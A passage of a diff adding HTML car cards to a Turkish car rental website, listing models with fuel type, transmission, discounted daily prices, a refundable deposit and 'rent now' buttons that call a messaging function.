+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Renault Megane')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Volkswagen Polo')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Volkswagen Polo</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Volkswagen Polo" class="car-image" src="assets/0807d9bf_6505D030-8762-4867-B631-AA635D2DB68F.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Volkswagen Polo')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.071 TL</span>
+<span class="amount">1.450 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Volkswagen Polo')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Volkswagen Polo')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="KONFOR">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Toyota Corolla')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Toyota Corolla</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">KONFOR</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Toyota Corolla" class="car-image" src="assets/3935d607_1416FC56-65C3-4898-B88E-C6514EE4D7B6.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Toyota Corolla')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.071 TL</span>
+<span class="amount">1.450 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Toyota Corolla')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Toyota Corolla')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="KONFOR">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Ford Focus')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Ford Focus</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">KONFOR</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Ford Focus" class="car-image" src="assets/48246c21_84DA1E5C-0CA2-4CE3-8208-F4362823F81A.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Manuel</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Ford Focus')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.071 TL</span>
+<span class="amount">1.450 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Ford Focus')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Ford Focus')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Citroen C3')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Citroen C3</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Citroen C3" class="car-image" src="assets/4e78ef6b_F81E2C97-7BF9-4A80-9531-35B6082DEE2E.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Citroen C3')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.143 TL</span>
+<span class="amount">1.500 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Citroen C3')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Citroen C3')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Opel Corsa')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Opel Corsa</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Opel Corsa" class="car-image" src="assets/f925ee28_7191658C-7A0F-49DF-A997-17BFD50C8808.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Opel Corsa')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.286 TL</span>
+<span class="amount">1.600 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Opel Corsa')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Opel Corsa')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="KONFOR">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Ford Puma')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Ford Puma</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">KONFOR</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Ford Puma" class="car-image" src="assets/04dbfd74_FE766C17-55CF-4738-A5C4-6E3C98048C5C.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Ford Puma')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.286 TL</span>
+<span class="amount">1.600 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Ford Puma')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Ford Puma')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PRESTİJ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Bmw 2 Serisi')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Bmw 2 Serisi</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PRESTİJ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Bmw 2 Serisi" class="car-image" src="assets/3e27d05f_IMG_20260226_175250_653.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Bmw 2 Serisi')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.286 TL</span>
+<span class="amount">1.600 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Bmw 2 Serisi')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Bmw 2 Serisi')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Seat Leon')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Seat Leon</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Seat Leon" class="car-image" src="assets/a9ebf175_BDDD028F-208F-422F-A2E5-016AA86B5BD3.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Seat Leon')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.357 TL</span>
+<span class="amount">1.650 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Seat Leon')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Seat Leon')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="KONFOR">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Opel Mokka')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Opel Mokka</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">KONFOR</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Opel Mokka" class="car-image" src="assets/17b41702_A278CC59-ADDF-40A9-9456-62154FF3C412.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Opel Mokka')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.429 TL</span>
+<span class="amount">1.700 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Opel Mokka')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Opel Mokka')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="KONFOR">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Peugeot 408')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Peugeot 408</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">KONFOR</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Peugeot 408" class="car-image" src="assets/7350390e_8B1F88E0-650E-41C2-87DE-6E55F07D1D22.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Peugeot 408')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.429 TL</span>
+<span class="amount">1.700 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Peugeot 408')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Peugeot 408')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="TİCARİ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('VW Caddy')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">VW Caddy</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">TİCARİ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="VW Caddy" class="car-image" src="assets/68740aff_C0CDC587-4916-4287-97FF-8FA9741DDABD.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('VW Caddy')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.571 TL</span>
+<span class="amount">1.800 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('VW Caddy')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('VW Caddy')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PRESTİJ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Toyota Corolla Cross')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Toyota Corolla Cross</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PRESTİJ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Toyota Corolla Cross" class="car-image" src="assets/c8cd0c64_4E67601D-ACCB-43A8-A3EF-D14CAF73B066.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Toyota Corolla Cross')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.571 TL</span>
+<span class="amount">1.800 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Toyota Corolla Cross')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Toyota Corolla Cross')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PRESTİJ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Skoda Superb')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Skoda Superb</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PRESTİJ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Skoda Superb" class="car-image" src="ilan/8194E53B-D655-4158-91CD-F90E03EA234C.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Skoda Superb')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.571 TL</span>
+<span class="amount">1.800 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Skoda Superb')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Skoda Superb')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PRESTİJ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Peugeot 3008')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Peugeot 3008</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PRESTİJ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Peugeot 3008" class="car-image" src="assets/2de4615b_D6AF8546-7A35-48BB-9202-87FFC345F70B.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Peugeot 3008')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.571 TL</span>
+<span class="amount">1.800 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Peugeot 3008')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Peugeot 3008')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Citroen C4X')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Citroen C4X</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Citroen C4X" class="car-image" src="assets/628aa61d_5131616D-6124-45C1-94C6-C13CA50460D3.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Citroen C4X')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.643 TL</span>
+<span class="amount">1.850 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Citroen C4X')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Citroen C4X')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PRESTİJ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
